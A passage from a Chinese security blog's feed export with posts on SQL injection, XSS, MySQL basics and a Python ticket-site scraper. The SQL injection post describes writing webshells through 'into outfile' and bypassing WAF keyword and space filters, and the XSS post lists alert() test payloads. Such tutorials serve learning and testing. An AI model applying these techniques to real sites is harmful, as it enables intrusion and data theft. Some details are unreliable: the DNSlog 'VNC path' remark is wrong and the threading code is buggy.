class="hljs-variable">$path</span>);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>流量分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入浅析</title>
    <link href="/2022/12/29/inject/"/>
    <url>/2022/12/29/inject/</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h3><p>​sql注入是常见的安全缺陷类型之一,在OWASP基金会的历年安全缺陷TOP 10报告披露的安全缺陷类型中占据前列。</p><h3 id="概念"><a href="#概念" class="headerlink" title="概念:"></a>概念:</h3><p>​      sql注入是由于服务器未对用户输入的数据进行过滤,或过滤不严格,导致用户输入直接拼接到数据库查询语句中,作为sql语句查询操作的一部分带入执行,从而实现非法操作。</p><p>​攻击者通过构建特定的数据库查询语句,通过页面响应结果来逐步获取想要得到的信息,进一步攻陷服务器.其危害小到获取网站用户的敏感信息(例如用户登录凭证,用户隐私资料等个人信息),大到通过脱库操作将整个网站数据库的信息全部泄露至外界,导致重大财产损失。</p><h3 id="sql注入类型说明"><a href="#sql注入类型说明" class="headerlink" title="sql注入类型说明:"></a>sql注入类型说明:</h3><p>   sql注入根据网站页面响应情况可分为 可联合注入、报错注入、布尔注入、宽字节注入、时间盲注、二次注入、堆叠注入。</p><h4 id="可联合注入"><a href="#可联合注入" class="headerlink" title="可联合注入"></a>可联合注入</h4><p>​通过union关键字进行子查询语句操作，要注意的是子查询的字段数需要和前面的查询字段数保持一致。</p><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>​通过执行数据库语句的返回的报错信息进行sql注入，利用原理是后端程序没有隐藏sql语句执行后的报错信息，直接显示在网站页面中，而sql语句的查询结果通过报错信息可以显示出来。常见的报错利用的sql函数有floor报错、ExtractVlaue报错、UpdateXML报错等。</p><h4 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h4><p>​    通过sql语句执行后，网站页面的响应情况进行sql注入操作,通常是基于页面返回的数据总量、或者某些页面元素的改变进行判断。将我们想要查询到的结果通过if关键字与ASCII码进行逐位对比，通过返回的布尔值（true 或者 false） 使用 and 关键字与正常业务逻辑处理的sql查询语句进行逻辑与运算，通过页面响应情况进行字符串判断。</p><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>​如果网站服务器的数据库使用了宽字节的编码方式（例如GBK等编码方式），攻击者可能会绕过网站的安全防护，因为 %df 加上 \ 会合并为一个汉字，最终会导致原本的转义效果失效，从而出现sql注入危害的风险。</p><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>​通过数据库中能影响数据库语句执行时间的函数来实现注入操作，例如MySQL中的sleep()   benchmark()  rlike()等，主要是通过执行sql注入后的页面的响应所需时间进行字段判断。这个注入方式受网络环境情况影响，网速快慢会影响判断的准确度。</p><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>​通过两次数据库操作实现sql注入。如果网站对用户输入数据进行了转义处理（例如将单双引号进行了转义，即  ‘    “  &#x3D;&gt;    \‘   \“),而数据库系统将数据保存时会自动去掉反斜杠\   因此我们可用通过将构造的特定数据库查询语句的一部分作为数据保存在数据库中，第二次再通过网站的相关功能点拼接执行执行我们写入数据库的查询语句，从而实现绕过安全防护的sql注入操作。该注入类型一般出现在网站中的个人信息修改，用户账户密码修改找回等与用户数据相关的功能点中。</p><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>​网站数据库使用了多语句查询方式，通过;号即可闭合上一条语句的执行。</p><h3 id="测试sql注入缺陷的常规步骤说明："><a href="#测试sql注入缺陷的常规步骤说明：" class="headerlink" title="测试sql注入缺陷的常规步骤说明："></a>测试sql注入缺陷的常规步骤说明：</h3><h4 id="1-首先判断是否存在sql注入缺陷，结合推断闭合方式进行"><a href="#1-首先判断是否存在sql注入缺陷，结合推断闭合方式进行" class="headerlink" title="1.首先判断是否存在sql注入缺陷，结合推断闭合方式进行"></a>1.首先判断是否存在sql注入缺陷，结合推断闭合方式进行</h4><p>​输出单双引号（‘ “），观察页面返回情况是否异常，如果出现sql语句报错信息，就完全能确认其闭合方式，后续sql注入方式也明确了（主要利用报错注入）</p><p>​确认闭合方式。可能存在sql注入缺陷的输入点的实际sql执行语句的闭合方式有多种情况，例如 单引号闭合，双引号闭合，小括号闭合，或者是数字型（没有闭合符号），也有可能是多种符号组合起来的闭合方式，如  ‘)    “)    ))  ‘)))等情况，根据具体情况考虑闭合方式。如果页面有显示位的话，尝试利用其来显示我们的SQL查询结果，这里要主要查询的字段数，通常利用order by 、group by 进行字段数判断。</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">注意：输入单双引号 ‘ “ ，页面异常，而输入双单引号” ’ ，页面返回正常页面，就能确认其闭合符号中包含单引号，可能是‘  <span class="hljs-comment">&#x27;)   ‘)) 等情况，反之即为闭合符号中包含双引号。如果测试单双引号和双单引号都引起页面异常的话，可以确定是 ） 或者是无符号闭合的情况</span><br></code></pre></td></tr></table></figure><p>​</p><p>​利用各种方式确认测试情况。如果页面是否查询到数据返回的页面的一样的话，可以考虑通过DNSlog外带注入的方式确认测试情况（这里要注意的是该方法仅适合网站服务器上的操作系统是Windows系统的情况，对于linux系统而言，并不适用，因为Linux系统没有VNC路径），我们还可以结合能够影响数据库语句执行时间的数据库系统函数进行闭合方式确认，如上文时间盲注中提到的sleep函数等，还可以尝试利用into outfile函数将查询结果写到网站的可访问路径下，然后通过浏览器进行访问。</p><h4 id="2-确认闭合方式后，尝试进一步渗透利用"><a href="#2-确认闭合方式后，尝试进一步渗透利用" class="headerlink" title="2.确认闭合方式后，尝试进一步渗透利用"></a>2.确认闭合方式后，尝试进一步渗透利用</h4><p>​一般来说，我们可以通过sql查询语句向目标服务器写入webshell，利用into outfile  、 into dumpfile等文件写入函数向其写入一句话木马。写入文件有前提条件，例如目标网站后端语言是PHP，那么考虑的因素有四点，其一：PHP是否开启了全局GPC， 其二：获取目标网站根目录的绝对路径， 其三：当前使用Mysql的用户是否具有读写权限 , 其四：数据库配置文件中是否设置了secure_file_priv&#x3D;，如果不能通过这种方式写shell的话，可用尝试利用全局日志或者慢日志进行webshell写入。</p><h4 id="3-链接webshell，进行后续渗透"><a href="#3-链接webshell，进行后续渗透" class="headerlink" title="3.链接webshell，进行后续渗透"></a>3.链接webshell，进行后续渗透</h4><p>​利用工具进行链接，或者通过自己编写的大马进行操作也可。后续的渗透流程根据具体情况进行。</p><p>​</p><h3 id="sql注入中，网站安全防护的绕过方式浅析："><a href="#sql注入中，网站安全防护的绕过方式浅析：" class="headerlink" title="sql注入中，网站安全防护的绕过方式浅析："></a>sql注入中，网站安全防护的绕过方式浅析：</h3><p>​通常情况下，绝大多数的网站都存在防护强度不一的安全防御机制，业内称之为网站waf，waf进一步又可分为代码型waf,硬件型waf，云waf,还有软件型waf等，这里着重说明软件型waf,以及代码型waf的绕过方式。</p><p>​软件型waf,像D盾、安全狗、宝塔waf之类市面上常见的安全产品，有一定的防御作用，但是仍有被绕过的可能，以下针对过滤规则进行说明。</p><h4 id="关键词过滤绕过"><a href="#关键词过滤绕过" class="headerlink" title="关键词过滤绕过"></a>关键词过滤绕过</h4><p>​如果waf对关键字进行了过滤，例如select 、union、database等词，可以考虑大小写，双写替换，使用其他等效的关键字，或者其他有相似作用的关键字进行替代，and 可以使用 &amp;&amp; 代替， or可以用||代替  ，&#x3D;号可用like代替，可以尝试利用内联注释绕过。甚至可以尝试利用字符混淆的方式进行检测绕过。</p><h4 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h4><p>​考虑使用其他符号等效代替，例如使用%0b 、%0a、注释等来代替空格，或者用小括号来闭合。</p><h4 id="注释过滤绕过"><a href="#注释过滤绕过" class="headerlink" title="注释过滤绕过"></a>注释过滤绕过</h4><p>​如果注释如–  # 号被过滤，可以尝试闭合后面的查询语句。</p><h4 id="单双引号被过滤"><a href="#单双引号被过滤" class="headerlink" title="单双引号被过滤"></a>单双引号被过滤</h4><p>​利用16进制数代替所要查询的字符串。</p><p>​</p>]]></content>
    
    
    
    <tags>
      
      <tag>SQL注入相关</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅析XSS漏洞</title>
    <link href="/2022/12/18/XSS/"/>
    <url>/2022/12/18/XSS/</url>
    
    <content type="html"><![CDATA[<h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">同源策略(Same-Origin <span class="hljs-keyword">Policy</span>)，就是为了保证互联网之中，各类资源的安全性而诞生的产物，它实际上是一个众多浏览器厂商共同遵守的约定。同源策略是浏览器中最基本的安全功能。缺少同源策略，很多浏览器的常规功能都会受到影响，可以说Web是构建在同源策略基础之上的。<br></code></pre></td></tr></table></figure><p>​＃同端口、同协议、同域名，即可称为同源。</p><h3 id="漏洞概念"><a href="#漏洞概念" class="headerlink" title="漏洞概念"></a>漏洞概念</h3><p>​XSS，也称之为跨站脚本攻击，这是一种基于前端语言的攻击手法，攻击者通过向web页面嵌入script代码，当用户浏览该页面时，嵌入其中的script代码就会被执行，达到恶意攻击用户的目的，包括窃取用户的cookie、实施钓鱼攻击、植入键盘记录器等。</p><h3 id="XSS类型说明"><a href="#XSS类型说明" class="headerlink" title="XSS类型说明"></a>XSS类型说明</h3><p>​XSS可分为三种类型，反射型XSS、储存型XSS、DOM型XSS</p><h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>​用户输入会作为页面的一部分进行呈现,恶意的输入数据使浏览器执行了JavaScript代码(比如读取cookie信息等)</p><h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><p>​用户输入的数据会永久存储在网站的数据库或者文件中,并且其他用户能查看相关该用户输入的内容(例如留言版等)</p><h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4><p>​通常无法从网站页面源代码分析出DOM型XSS，这是通过对DOM节点进行操作而触发的XSS，是不经过浏览器解析的，建议使用开发者工具确定该类型的标签位置,从而根据实际情况构造JavaScript语句混杂一些HTML代码来闭合执行,&amp;gt; &amp;lt; &#x2F; 等一些特殊字符可以被当作标签包裹中字符串的一部分,恰当使用单双引号进行闭合。</p><h3 id="XSS安全缺陷类型的测试方式说明"><a href="#XSS安全缺陷类型的测试方式说明" class="headerlink" title="XSS安全缺陷类型的测试方式说明"></a>XSS安全缺陷类型的测试方式说明</h3><h4 id="1-找到XSS挖掘点"><a href="#1-找到XSS挖掘点" class="headerlink" title="1.找到XSS挖掘点"></a>1.找到XSS挖掘点</h4><p>​主要关注搜索框、留言板、评论区、个人信息显示这些能够影响当前页面元素标签的功能点，建议使用开发者工具确定该类型的标签位置,从而根据实际情况构造JavaScript语句混杂一些HTML代码来闭合执行,&amp;gt; &amp;lt; &#x2F; 等一些特殊字符可以被当作标签包裹中字符串的一部分,恰当使用单双引号进行闭合。</p><h4 id="２-测试XSS漏洞是否存在"><a href="#２-测试XSS漏洞是否存在" class="headerlink" title="２.测试XSS漏洞是否存在"></a>２.测试XSS漏洞是否存在</h4><p>​目标网站可能有相应的针对XSS的安全防护机制，例如对＜＞＇　＂等符号进行转义处理，导致无法闭合标签，从而不能引发XSS。尝试通过一些测试用例对网站进行检测，例如：向挖掘点输入＜＇＂，查看网站源代码中是否是已经转义了的字符，如果不是十分完善的安全处理机制，挖掘出XSS漏洞还是很有可能的。</p><h4 id="３-XSS的注入手法浅析"><a href="#３-XSS的注入手法浅析" class="headerlink" title="３.XSS的注入手法浅析"></a>３.XSS的注入手法浅析</h4><p>​我们一般通过一些标签实现跨域请求（例如script、img、video等标签），通过闭合标签，向web页面嵌入恶意的script代码，通过事件触发script代码，这里需要考虑一些绕过安全防护的测试手法，使用双写、大小写、编码（html编码  js编码 url编码 base64编码）方式绕过相关过滤机制，ａ标签可以考虑是否可以在链接中嵌入 JavaScript:: 来执行script代码。</p><p>弹窗标签示例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs HTML"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">alert<span class="hljs-string">`1`</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert`1`&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:alert`1`&quot;</span>&gt;</span>点击这里<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>​</p><p>​</p><p>​</p>]]></content>
    
    
    
    <tags>
      
      <tag>XSS相关</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql学习笔记</title>
    <link href="/2022/11/19/mysql/"/>
    <url>/2022/11/19/mysql/</url>
    
    <content type="html"><![CDATA[<p>​最近在学习一些关于MySQL数据库的基本命令用法,收获不少,在这里做个简单的学习笔记总结,. </p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">＃请注意<span class="hljs-symbol">:MySQL</span>不区分大小写<br></code></pre></td></tr></table></figure><h3 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库:"></a>创建数据库:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create database 数据库名;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs MySQL">示例:<br>create database test #创建了一个名为test的数据库<br></code></pre></td></tr></table></figure><h3 id="创建表"><a href="#创建表" class="headerlink" title="创建表:"></a>创建表:</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">创建表的一般格式: create <span class="hljs-selector-tag">table</span> 表名(字段一  类型 <span class="hljs-selector-attr">[可选的字段约束]</span>, 字段二  类型  <span class="hljs-selector-attr">[可选的字段约束]</span>,  ...)<br></code></pre></td></tr></table></figure><p><strong>示例:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">use test #切换到刚创建好的test库<br><br>create table student(id int(10) not null primary key auto_increment,name varchar(255) not null default &#x27;学生&#x27;,sex enum(&#x27;男&#x27;,&#x27;女&#x27;) not null,classid char(6) not null); <br>注意:字段之间以逗号(,)分隔.<br></code></pre></td></tr></table></figure><p><strong>一些字段约束的定义:</strong></p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>:表示该字段不能为空<br><span class="hljs-keyword">primary</span> <span class="hljs-keyword">key</span>: 设置为主键,主键有且只有一个<br>auto_increment:自动递增,只有设置为主键的字段才可以设置该约束<br>defalt:字段的默认值,需与该字段定义的数据类型一致<br></code></pre></td></tr></table></figure><h3 id="往表里添加数据"><a href="#往表里添加数据" class="headerlink" title="往表里添加数据:"></a>往表里添加数据:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs MySQL">insert into 表名(字段1,字段2,...,字段*) values(数值1,数值2,..,数值*), (数值1,数值2,..,数值*),..., (数值1,数值2,..,数值*);<br></code></pre></td></tr></table></figure><p><em>#字段和数值要一一对应,values后面有几个小括号()就表示添加多少行数据</em></p><p><strong>示例:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">insert into student(sex,classid,name) values(&#x27;男&#x27;,&#x27;class1&#x27;,&#x27;李华&#x27;), (&#x27;女&#x27;,&#x27;class2&#x27;, &#x27;小红&#x27;),(&#x27;女&#x27;,&#x27;class3&#x27;,&#x27;芳芳&#x27;);<br><br>insert into student(sex,classid) values(&#x27;男&#x27;,&#x27;class4&#x27;)  #name字段设置了默认值,会自动填充<br></code></pre></td></tr></table></figure><p><strong>运行结果如下图所示:</strong></p><p><img src="/images/5a3dff6addf4434f94975b6d7a24664c.png" alt="img"></p><h3 id="修改表中的数据"><a href="#修改表中的数据" class="headerlink" title="修改表中的数据:"></a>修改表中的数据:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">update 表名  set 字段1 = 数值1,.........,字段2 = 数值2,字段* = 数值* where id = 要修改的字段id号<br></code></pre></td></tr></table></figure><p><strong>示例:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs MySQL">update student set sex = &#x27;男&#x27;,name = &#x27;芳华&#x27; where id = 3 <br></code></pre></td></tr></table></figure><p>​#修改语句要加上where条件,但不一定要通过id来选择要修改的语句,<br>只要where条件语句使用恰当即可</p><h3 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据:"></a>查询数据:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs MySQL">一般用法:   select  *  from 表名  #表示在当前数据库下查找<br>select * from 表名 where 条件 #查找符合条件的语句<br>select count(*) from 表`名 where 条件 #统计符合条件的数据条目总数<br></code></pre></td></tr></table></figure><p><strong>示例:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs MySQL">select count(*) from student where sex = &#x27;男&#x27; #查找student表的男生数量<br></code></pre></td></tr></table></figure><h3 id="对查询数据进行分组"><a href="#对查询数据进行分组" class="headerlink" title="对查询数据进行分组:"></a>对查询数据进行分组:</h3><p><strong>示例:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs MySQL">select GROUP_CONCAT(name),sex from student group by sex;<br></code></pre></td></tr></table></figure><p><strong>结果如下图所示:</strong></p><p><img src="/images/634475737df949c5a5fe873d23d934c4.png" alt="img"></p><h3 id="删除表"><a href="#删除表" class="headerlink" title="删除表:"></a>删除表:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">一般写法: delete from 表名 where 条件<br></code></pre></td></tr></table></figure><p><strong>示例:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">delete from student where id =3 #删除了表中id 为3的字段<br></code></pre></td></tr></table></figure><h3 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库:"></a>删除数据库:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs MySQL">一般写法: drop database 数据库名<br></code></pre></td></tr></table></figure><p><strong>示例:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs MySQL">drop database student #删除名为student的库<br></code></pre></td></tr></table></figure><h3 id="导出数据库中的指定的数据表"><a href="#导出数据库中的指定的数据表" class="headerlink" title="导出数据库中的指定的数据表 :"></a>导出数据库中的指定的数据表 :</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysqldump -u 用户名 -p 数据库名 表1 表2 &gt; 导出文件名  <br></code></pre></td></tr></table></figure><p><strong>使用source 命令可以将.sql文件导入数据库</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">一般写法: <br>use 你想导入的数据库名 <br>source .sql的文件路径<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>mysql相关</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>爬虫demo笔记</title>
    <link href="/2022/11/17/pachong/"/>
    <url>/2022/11/17/pachong/</url>
    
    <content type="html"><![CDATA[<p>​爬取页面用到三个库: BeautifulSoup以及request还有threading库.使用request库请求网页页面,将抓取到的内容使用BeautifulSoup库里面的方法进行筛选处理,而threading库则是用来实现多线程爬虫,提高爬虫效率.以获取某售票网站的信息作为爬虫内容,以下是实现该目标的python爬虫源码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#该文件命名为pachong2.py</span><br><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>: <span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-comment"># 定义head头</span><br>    default_header = &#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&#x27;</span>,<br>        <span class="hljs-string">&quot;sec-ch-ua-platform&quot;</span>: <span class="hljs-string">&quot;Windows&quot;</span><br><br>    &#125;<br>    <span class="hljs-comment"># 导入需要的模块</span><br>    <span class="hljs-keyword">import</span> requests<br>    <span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>    <span class="hljs-comment"># 构建url</span><br>    url = <span class="hljs-string">&quot;https://www.moretickets.com/list/1101-all/latest/p&quot;</span><br>    url = url + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>)<br><br>    response = requests.get(url, headers=default_header)<br>    response1 = response.text<br><br>    soup = BeautifulSoup(response1, <span class="hljs-string">&quot;html.parser&quot;</span>)<br><br>    name = []<br>    image_url = []<br>    status = []<br>    address = []<br>    open_time = []<br>    price = []<br>    num = <span class="hljs-number">0</span><br><br>    <span class="hljs-comment"># 筛选数据并存到列表中</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> soup.find_all(attrs=&#123;<span class="hljs-string">&quot;class&quot;</span>: <span class="hljs-string">&quot;show-name&quot;</span>&#125;):<br>        name.append(<span class="hljs-built_in">str</span>(i.string).split())<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> soup.find_all(name=<span class="hljs-string">&quot;div&quot;</span>, attrs=&#123;<span class="hljs-string">&quot;class&quot;</span>: <span class="hljs-string">&quot;show-poster&quot;</span>&#125;):<br>        image_url.append(i.contents[<span class="hljs-number">1</span>][<span class="hljs-string">&quot;data-src&quot;</span>])<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> soup.find_all(name=<span class="hljs-string">&quot;div&quot;</span>, attrs=&#123;<span class="hljs-string">&quot;class&quot;</span>: <span class="hljs-string">&quot;tags&quot;</span>&#125;):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(i.contents) &gt; <span class="hljs-number">1</span>:<br>            status.append(i.contents[<span class="hljs-number">1</span>].string)<br>        <span class="hljs-keyword">else</span>:<br>            status.append(<span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> soup.find_all(name=<span class="hljs-string">&quot;div&quot;</span>, attrs=&#123;<span class="hljs-string">&quot;class&quot;</span>: <span class="hljs-string">&quot;show-addr&quot;</span>&#125;):<br>        address.append(i.string)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> soup.find_all(name=<span class="hljs-string">&quot;div&quot;</span>, attrs=&#123;<span class="hljs-string">&quot;class&quot;</span>: <span class="hljs-string">&quot;show-time&quot;</span>&#125;):<br>        open_time.append(i.string)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> soup.find_all(name=<span class="hljs-string">&quot;div&quot;</span>, attrs=&#123;<span class="hljs-string">&quot;class&quot;</span>: <span class="hljs-string">&quot;show-price&quot;</span>&#125;):<br>        a = <span class="hljs-built_in">str</span>(i.contents[<span class="hljs-number">0</span>]).split()<br>        price.append(a)<br><br>    <span class="hljs-comment"># 打印数据</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;________________________________&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(name)):<br>        <span class="hljs-built_in">print</span>(name[num][<span class="hljs-number">0</span>])<br>        <span class="hljs-built_in">print</span>(image_url[num])<br>        <span class="hljs-keyword">if</span> price[num]:<br>            <span class="hljs-built_in">print</span>(status[num])<br>        <span class="hljs-built_in">print</span>(open_time[num])<br>        <span class="hljs-built_in">print</span>(address[num])<br>        <span class="hljs-keyword">if</span> price[num]:<br>            <span class="hljs-built_in">print</span>(price[num][<span class="hljs-number">0</span>], <span class="hljs-string">&quot;元起&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;________________________________&quot;</span>)<br>        num += <span class="hljs-number">1</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>      <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">from</span> pachong2 <span class="hljs-keyword">import</span> run<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    end = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要爬取的页数:&quot;</span>)) + <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始爬取页面&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br><br>        threads = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, end):<br>            runner = run(i)<br>            threads.append(threading.Thread(target=runner, name=<span class="hljs-string">&quot;爬虫&#123;&#125;号&quot;</span>.<span class="hljs-built_in">format</span>(i), args=(i,)))<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第&quot;</span>, i, <span class="hljs-string">&quot;页&quot;</span>)<br><br>        <span class="hljs-keyword">for</span> thread <span class="hljs-keyword">in</span> threads:<br>            <span class="hljs-built_in">print</span>(<span 